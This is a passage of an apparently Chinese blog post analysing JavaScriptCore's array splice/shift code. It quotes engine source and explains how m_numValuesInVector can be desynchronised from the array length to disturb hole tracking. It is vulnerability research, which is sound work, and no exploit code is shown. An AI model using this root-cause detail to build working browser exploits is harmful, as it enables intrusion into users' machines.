class="hljs-built_in">speciesConstructArray</span>(globalObject, thisObj, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">EXCEPTION_ASSERT</span>(!!scope.<span class="hljs-built_in">exception</span>() == (speciesResult.first == SpeciesConstructResult::Exception));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">UNLIKELY</span>(speciesResult.first == SpeciesConstructResult::Exception))<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">encodedJSValue</span>();<br><br>        JSObject* result;<br>        <span class="hljs-keyword">if</span> (speciesResult.first == SpeciesConstructResult::CreatedObject)<br>            result = speciesResult.second;<br>        <span class="hljs-keyword">else</span> &#123;<br>            result = <span class="hljs-built_in">constructEmptyArray</span>(globalObject, <span class="hljs-literal">nullptr</span>);<br>            <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">encodedJSValue</span>());<br>        &#125;<br><br>        <span class="hljs-built_in">setLength</span>(globalObject, vm, result, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">encodedJSValue</span>());<br>        scope.<span class="hljs-built_in">release</span>();<br>        <span class="hljs-built_in">setLength</span>(globalObject, vm, thisObj, length);<br>        <span class="hljs-keyword">return</span> JSValue::<span class="hljs-built_in">encode</span>(result);<br>    &#125;<br><br>    <span class="hljs-type">uint64_t</span> actualStart = <span class="hljs-built_in">argumentClampedIndexFromStartOrEnd</span>(globalObject, callFrame-&gt;<span class="hljs-built_in">argument</span>(<span class="hljs-number">0</span>), length);<br>    <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">encodedJSValue</span>());<br><br>    <span class="hljs-type">uint64_t</span> actualDeleteCount = length - actualStart;<br>    <span class="hljs-keyword">if</span> (callFrame-&gt;<span class="hljs-built_in">argumentCount</span>() &gt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-type">double</span> deleteCount = callFrame-&gt;<span class="hljs-built_in">uncheckedArgument</span>(<span class="hljs-number">1</span>).<span class="hljs-built_in">toInteger</span>(globalObject);<br>        <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">encodedJSValue</span>());<br>        <span class="hljs-keyword">if</span> (deleteCount &lt; <span class="hljs-number">0</span>)<br>            actualDeleteCount = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (deleteCount &gt; length - actualStart)<br>            actualDeleteCount = length - actualStart;<br>        <span class="hljs-keyword">else</span><br>            actualDeleteCount = <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">uint64_t</span>&gt;(deleteCount);<br>    &#125;<br>    <span class="hljs-type">unsigned</span> itemCount = std::<span class="hljs-built_in">max</span>&lt;<span class="hljs-type">int</span>&gt;(callFrame-&gt;<span class="hljs-built_in">argumentCount</span>() - <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">UNLIKELY</span>(length - actualDeleteCount + itemCount &gt; <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">uint64_t</span>&gt;(<span class="hljs-built_in">maxSafeInteger</span>())))<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">throwVMTypeError</span>(globalObject, scope, <span class="hljs-string">&quot;Splice cannot produce an array of length larger than (2 ** 53) - 1&quot;</span>_s);<br><br>    std::pair&lt;SpeciesConstructResult, JSObject*&gt; speciesResult = <span class="hljs-built_in">speciesConstructArray</span>(globalObject, thisObj, actualDeleteCount);<br>    <span class="hljs-built_in">EXCEPTION_ASSERT</span>(!!scope.<span class="hljs-built_in">exception</span>() == (speciesResult.first == SpeciesConstructResult::Exception));<br>    <span class="hljs-keyword">if</span> (speciesResult.first == SpeciesConstructResult::Exception)<br>        <span class="hljs-keyword">return</span> JSValue::<span class="hljs-built_in">encode</span>(<span class="hljs-built_in">jsUndefined</span>());<br><br>    JSObject* result = <span class="hljs-literal">nullptr</span>;<br>    <span class="hljs-type">bool</span> okToDoFastPath = speciesResult.first == SpeciesConstructResult::FastPath &amp;&amp; <span class="hljs-built_in">isJSArray</span>(thisObj) &amp;&amp; length == <span class="hljs-built_in">toLength</span>(globalObject, thisObj);<br>    <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">encodedJSValue</span>());<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">LIKELY</span>(okToDoFastPath))<br>        result = <span class="hljs-built_in">asArray</span>(thisObj)-&gt;<span class="hljs-built_in">fastSlice</span>(globalObject, <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">uint32_t</span>&gt;(actualStart), <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">uint32_t</span>&gt;(actualDeleteCount));<br><br>    <span class="hljs-keyword">if</span> (!result) &#123;<br>        <span class="hljs-keyword">if</span> (speciesResult.first == SpeciesConstructResult::CreatedObject)<br>            result = speciesResult.second;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">UNLIKELY</span>(actualDeleteCount &gt; std::numeric_limits&lt;<span class="hljs-type">uint32_t</span>&gt;::<span class="hljs-built_in">max</span>())) &#123;<br>                <span class="hljs-built_in">throwRangeError</span>(globalObject, scope, LengthExceededTheMaximumArrayLengthError);<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">encodedJSValue</span>();<br>            &#125;<br>            result = JSArray::<span class="hljs-built_in">tryCreate</span>(vm, globalObject-&gt;<span class="hljs-built_in">arrayStructureForIndexingTypeDuringAllocation</span>(ArrayWithUndecided), <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">uint32_t</span>&gt;(actualDeleteCount));<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">UNLIKELY</span>(!result)) &#123;<br>                <span class="hljs-built_in">throwOutOfMemoryError</span>(globalObject, scope);<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">encodedJSValue</span>();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">uint64_t</span> k = <span class="hljs-number">0</span>; k &lt; actualDeleteCount; ++k) &#123;<br>            JSValue v = <span class="hljs-built_in">getProperty</span>(globalObject, thisObj, k + actualStart);<br>            <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">encodedJSValue</span>());<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">UNLIKELY</span>(!v))<br>                <span class="hljs-keyword">continue</span>;<br>            result-&gt;<span class="hljs-built_in">putDirectIndex</span>(globalObject, k, v, <span class="hljs-number">0</span>, PutDirectIndexShouldThrow);<br>            <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">encodedJSValue</span>());<br>        &#125;<br>        <span class="hljs-built_in">setLength</span>(globalObject, vm, result, actualDeleteCount);<br>        <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, &#123; &#125;);<br>    &#125;<br>    <span class="hljs-comment">//增加的数量小于删除的调用shift，增加的数量大于删除的调用unshift</span><br>    <span class="hljs-keyword">if</span> (itemCount &lt; actualDeleteCount) &#123;<br>        <span class="hljs-built_in">shift</span>&lt;JSArray::ShiftCountForSplice&gt;(globalObject, thisObj, actualStart, actualDeleteCount, itemCount, length);<br>        <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">encodedJSValue</span>());<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (itemCount &gt; actualDeleteCount) &#123;<br>        <span class="hljs-built_in">unshift</span>&lt;JSArray::ShiftCountForSplice&gt;(globalObject, thisObj, actualStart, actualDeleteCount, itemCount, length);<br>        <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">encodedJSValue</span>());<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> k = <span class="hljs-number">0</span>; k &lt; itemCount; ++k) &#123;<br>        thisObj-&gt;<span class="hljs-built_in">putByIndexInline</span>(globalObject, k + actualStart, callFrame-&gt;<span class="hljs-built_in">uncheckedArgument</span>(k + <span class="hljs-number">2</span>), <span class="hljs-literal">true</span>);<br>        <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">encodedJSValue</span>());<br>    &#125;<br>    <br>    scope.<span class="hljs-built_in">release</span>();<br>    <span class="hljs-built_in">setLength</span>(globalObject, vm, thisObj, length - actualDeleteCount + itemCount);<br>    <span class="hljs-keyword">return</span> JSValue::<span class="hljs-built_in">encode</span>(result);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="shift"><a href="#shift" class="headerlink" title="shift"></a>shift</h3><p>下面第15行调用了shiftCount函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;JSArray::ShiftCountMode shiftCountMode&gt;</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">shift</span><span class="hljs-params">(ExecState* exec, JSObject* thisObj, <span class="hljs-type">unsigned</span> header, <span class="hljs-type">unsigned</span> currentCount, <span class="hljs-type">unsigned</span> resultCount, <span class="hljs-type">unsigned</span> length)</span></span><br><span class="hljs-function"></span>&#123;<br>    VM&amp; vm = exec-&gt;<span class="hljs-built_in">vm</span>();<br>    <span class="hljs-keyword">auto</span> scope = <span class="hljs-built_in">DECLARE_THROW_SCOPE</span>(vm);<br><br>    <span class="hljs-built_in">RELEASE_ASSERT</span>(currentCount &gt; resultCount);<br>    <span class="hljs-type">unsigned</span> count = currentCount - resultCount;<br><br>    <span class="hljs-built_in">RELEASE_ASSERT</span>(header &lt;= length);<br>    <span class="hljs-built_in">RELEASE_ASSERT</span>(currentCount &lt;= (length - header));<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isJSArray</span>(thisObj)) &#123;<br>        JSArray* array = <span class="hljs-built_in">asArray</span>(thisObj);<br>        <span class="hljs-keyword">if</span> (array-&gt;<span class="hljs-built_in">length</span>() == length &amp;&amp; array-&gt;<span class="hljs-built_in">shiftCount</span>&lt;shiftCountMode&gt;(exec, header, count))<br>            <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> k = header; k &lt; length - currentCount; ++k) &#123;<br>        <span class="hljs-type">unsigned</span> from = k + currentCount;<br>        <span class="hljs-type">unsigned</span> to = k + resultCount;<br>        JSValue value = <span class="hljs-built_in">getProperty</span>(exec, thisObj, from);<br>        <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">void</span>());<br>        <span class="hljs-keyword">if</span> (value) &#123;<br>            thisObj-&gt;<span class="hljs-built_in">putByIndexInline</span>(exec, to, value, <span class="hljs-literal">true</span>);<br>            <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">void</span>());<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">bool</span> success = thisObj-&gt;<span class="hljs-built_in">methodTable</span>(vm)-&gt;<span class="hljs-built_in">deletePropertyByIndex</span>(thisObj, exec, to);<br>            <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">void</span>());<br>            <span class="hljs-keyword">if</span> (!success) &#123;<br>                <span class="hljs-built_in">throwTypeError</span>(exec, scope, UnableToDeletePropertyError);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> k = length; k &gt; length - count; --k) &#123;<br>        <span class="hljs-type">bool</span> success = thisObj-&gt;<span class="hljs-built_in">methodTable</span>(vm)-&gt;<span class="hljs-built_in">deletePropertyByIndex</span>(thisObj, exec, k - <span class="hljs-number">1</span>);<br>        <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">void</span>());<br>        <span class="hljs-keyword">if</span> (!success) &#123;<br>            <span class="hljs-built_in">throwTypeError</span>(exec, scope, UnableToDeletePropertyError);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="shiftCount"><a href="#shiftCount" class="headerlink" title="shiftCount"></a>shiftCount</h4><p>下面第8行紧接着调用<code>shiftCountForSplice</code>函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;ShiftCountMode shiftCountMode&gt;</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">shiftCount</span><span class="hljs-params">(JSGlobalObject* globalObject, <span class="hljs-type">unsigned</span>&amp; startIndex, <span class="hljs-type">unsigned</span> count)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (shiftCountMode) &#123;<br>    <span class="hljs-keyword">case</span> ShiftCountForShift:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">shiftCountForShift</span>(globalObject, startIndex, count);<br>    <span class="hljs-keyword">case</span> ShiftCountForSplice:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">shiftCountForSplice</span>(globalObject, startIndex, count);<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">CRASH</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="shiftCountForSplice"><a href="#shiftCountForSplice" class="headerlink" title="shiftCountForSplice"></a>shiftCountForSplice</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">shiftCountForSplice</span><span class="hljs-params">(JSGlobalObject* globalObject, <span class="hljs-type">unsigned</span>&amp; startIndex, <span class="hljs-type">unsigned</span> count)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">shiftCountWithAnyIndexingType</span>(globalObject, startIndex, count);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="shiftCountWithAnyIndexingType"><a href="#shiftCountWithAnyIndexingType" class="headerlink" title="shiftCountWithAnyIndexingType"></a>shiftCountWithAnyIndexingType</h4><p>下面第34行会调用<code>shiftCountWithArrayStorage</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">JSArray::shiftCountWithAnyIndexingType</span><span class="hljs-params">(ExecState* exec, <span class="hljs-type">unsigned</span>&amp; startIndex, <span class="hljs-type">unsigned</span> count)</span></span><br><span class="hljs-function"></span>&#123;<br>    VM&amp; vm = exec-&gt;<span class="hljs-built_in">vm</span>();<br>    <span class="hljs-built_in">RELEASE_ASSERT</span>(count &gt; <span class="hljs-number">0</span>);<br><br>    <span class="hljs-built_in">ensureWritable</span>(vm);<br><br>    Butterfly* butterfly = <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">butterfly</span>();<br><br>    <span class="hljs-keyword">switch</span> (<span class="hljs-built_in">indexingType</span>()) &#123;<br>    <span class="hljs-keyword">case</span> ArrayClass:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-keyword">case</span> ArrayWithUndecided:<br>        <span class="hljs-comment">// Don&#x27;t handle this because it&#x27;s confusing and it shouldn&#x27;t come up.</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">case</span> ArrayWithInt32:<br>    <span class="hljs-keyword">case</span> ArrayWithContiguous: &#123;<br>        <span class="hljs-type">unsigned</span> oldLength = butterfly-&gt;<span class="hljs-built_in">publicLength</span>();<br>    <span class="hljs-comment">//...</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">case</span> ArrayWithDouble: &#123;<br>        <span class="hljs-type">unsigned</span> oldLength = butterfly-&gt;<span class="hljs-built_in">publicLength</span>();<br>        <span class="hljs-built_in">RELEASE_ASSERT</span>(count &lt;= oldLength);<br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">case</span> ArrayWithArrayStorage:<br>    <span class="hljs-keyword">case</span> ArrayWithSlowPutArrayStorage:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">shiftCountWithArrayStorage</span>(vm, startIndex, count, <span class="hljs-built_in">arrayStorage</span>());<br><br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">CRASH</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="shiftCountWithArrayStorage"><a href="#shiftCountWithArrayStorage" class="headerlink" title="shiftCountWithArrayStorage"></a>shiftCountWithArrayStorage</h4><p>主要关注第8行和第19行，第8行由于<code>this-&gt;structure(vm)-&gt;holesMustForwardToPrototype(vm, this)</code>使得其所在的判断语句<code>(storage-&gt;hasHoles() &amp;&amp; this-&gt;structure(vm)-&gt;holesMustForwardToPrototype(vm, this)</code>为<code>false</code>。然后到第19行<code>storage-&gt;m_numValuesInVector -= count;</code>这条语句是修改数组的元素个数，这就意味着我们可以操控数组元素的个数，这又影响着<code>hasHoles</code>函数，继而影响后面的unshift。</p><p>当数组中元素的数量和其长度不匹配时就是有洞：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">hasHoles</span><span class="hljs-params">()</span> <span class="hljs-type">const</span>                         </span><br><span class="hljs-function"></span>&#123;                                             <br>    <span class="hljs-keyword">return</span> m_numValuesInVector != <span class="hljs-built_in">length</span>();   <br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">JSArray::shiftCountWithArrayStorage</span><span class="hljs-params">(VM&amp; vm, <span class="hljs-type">unsigned</span> startIndex, <span class="hljs-type">unsigned</span> count, ArrayStorage* storage)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">unsigned</span> oldLength = storage-&gt;<span class="hljs-built_in">length</span>();<br>    <span class="hljs-built_in">RELEASE_ASSERT</span>(count &lt;= oldLength);<br>    <br>    <span class="hljs-comment">// If the array contains holes or is otherwise in an abnormal state,</span><br>    <span class="hljs-comment">// use the generic algorithm in ArrayPrototype.</span><br>    <span class="hljs-keyword">if</span> ((storage-&gt;<span class="hljs-built_in">hasHoles</span>() &amp;&amp; <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">structure</span>(vm)-&gt;<span class="hljs-built_in">holesMustForwardToPrototype</span>(vm, <span class="hljs-keyword">this</span>)) <br>        || <span class="hljs-built_in">hasSparseMap</span>() <br>        || <span class="hljs-built_in">shouldUseSlowPut</span>(<span class="hljs-built_in">indexingType</span>())) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!oldLength)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <br>    <span class="hljs-type">unsigned</span> length = oldLength - count;<br>    <br>    storage-&gt;m_numValuesInVector -= count;<br>    storage-&gt;<span class="hljs-built_in">setLength</span>(length);<br>    <br>    <span class="hljs-type">unsigned</span> vectorLength = storage-&gt;<span class="hljs-built_in">vectorLength</span>();<br>    <span class="hljs-keyword">if</span> (!vectorLength)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <br>    <span class="hljs-keyword">if</span> (startIndex &gt;= vectorLength)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <br>    DisallowGC disallowGC;<br>    <span class="hljs-keyword">auto</span> locker = <span class="hljs-built_in">holdLock</span>(<span class="hljs-built_in">cellLock</span>());<br>    <br>    <span class="hljs-keyword">if</span> (startIndex + count &gt; vectorLength)<br>        count = vectorLength - startIndex;<br>    <br>    <span class="hljs-type">unsigned</span> usedVectorLength = std::<span class="hljs-built_in">min</span>(vectorLength, oldLength);<br>    <br>    <span class="hljs-type">unsigned</span> numElementsBeforeShiftRegion = startIndex;<br>    <span class="hljs-type">unsigned</span> firstIndexAfterShiftRegion = startIndex + count;<br>    <span class="hljs-type">unsigned</span> numElementsAfterShiftRegion = usedVectorLength - firstIndexAfterShiftRegion;<br>    <span class="hljs-built_in">ASSERT</span>(numElementsBeforeShiftRegion + count + numElementsAfterShiftRegion == usedVectorLength);<br><br>    <span class="hljs-comment">// The point of this comparison seems to be to minimize the amount of elements that have to </span><br>    <span class="hljs-comment">// be moved during a shift operation.</span><br>    <span class="hljs-keyword">if</span> (numElementsBeforeShiftRegion &lt; numElementsAfterShiftRegion) &#123;<br>        <span class="hljs-comment">// The number of elements before the shift region is less than the number of elements</span><br>        <span class="hljs-comment">// after the shift region, so we move the elements before to the right.</span><br>        <span class="hljs-keyword">if</span> (numElementsBeforeShiftRegion) &#123;<br>            <span class="hljs-built_in">RELEASE_ASSERT</span>(count + startIndex &lt;= vectorLength);<br>            <span class="hljs-keyword">if</span> (storage-&gt;<span class="hljs-built_in">hasHoles</span>()) &#123;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> i = startIndex; i-- &gt; <span class="hljs-number">0</span>;) &#123;<br>                    <span class="hljs-type">unsigned</span> destinationIndex = count + i;<br>                    JSValue source = storage-&gt;m_vector[i].<span class="hljs-built_in">get</span>();<br>                    JSValue dest = storage-&gt;m_vector[destinationIndex].<span class="hljs-built_in">get</span>();<br>                    <span class="hljs-comment">// Any time we overwrite a hole we know we overcounted the number of values we removed </span><br>                    <span class="hljs-comment">// when we subtracted count from m_numValuesInVector above.</span><br>                    <span class="hljs-keyword">if</span> (!dest &amp;&amp; destinationIndex &gt;= firstIndexAfterShiftRegion)<br>                        storage-&gt;m_numValuesInVector++;<br>                    storage-&gt;m_vector[count + i].<span class="hljs-built_in">setWithoutWriteBarrier</span>(source);<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">memmove</span>(storage-&gt;m_vector + count,<br>                    storage-&gt;m_vector,<br>                    <span class="hljs-built_in">sizeof</span>(JSValue) * startIndex);<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// Adjust the Butterfly and the index bias. We only need to do this here because we&#x27;re changing</span><br>        <span class="hljs-comment">// the start of the Butterfly, which needs to point at the first indexed property in the used</span><br>        <span class="hljs-comment">// portion of the vector.</span><br>        Butterfly* butterfly = <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">butterfly</span>()-&gt;<span class="hljs-built_in">shift</span>(<span class="hljs-built_in">structure</span>(vm), count);<br>        storage = butterfly-&gt;<span class="hljs-built_in">arrayStorage</span>();<br>        storage-&gt;m_indexBias += count;<br><br>        <span class="hljs-comment">// Since we&#x27;re consuming part of the vector by moving its beginning to the left,</span><br>        <span class="hljs-comment">// we need to modify the vector length appropriately.</span><br>        storage-&gt;<span class="hljs-built_in">setVectorLength</span>(vectorLength - count);<br>        <span class="hljs-built_in">setButterfly</span>(vm, butterfly);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// The number of elements before the shift region is greater than or equal to the number </span><br>        <span class="hljs-comment">// of elements after the shift region, so we move the elements after the shift region to the left.</span><br>        <span class="hljs-keyword">if</span> (storage-&gt;<span class="hljs-built_in">hasHoles</span>()) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> i = <span class="hljs-number">0</span>; i &lt; numElementsAfterShiftRegion; ++i) &#123;<br>                <span class="hljs-type">unsigned</span> destinationIndex = startIndex + i;<br>                JSValue source = storage-&gt;m_vector[firstIndexAfterShiftRegion + i].<span class="hljs-built_in">get</span>();<br>                JSValue dest = storage-&gt;m_vector[destinationIndex].<span class="hljs-built_in">get</span>();<br>                <span class="hljs-comment">// Any time we overwrite a hole we know we overcounted the number of values we removed </span><br>                <span class="hljs-comment">// when we subtracted count from m_numValuesInVector above.</span><br>                <span class="hljs-keyword">if</span> (!dest &amp;&amp; destinationIndex &lt; firstIndexAfterShiftRegion)<br>                    storage-&gt;m_numValuesInVector++;<br>                storage-&gt;m_vector[startIndex + i].<span class="hljs-built_in">setWithoutWriteBarrier</span>(source);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">memmove</span>(storage-&gt;m_vector + startIndex,<br>                storage-&gt;m_vector + firstIndexAfterShiftRegion,<br>                <span class="hljs-built_in">sizeof</span>(JSValue) * 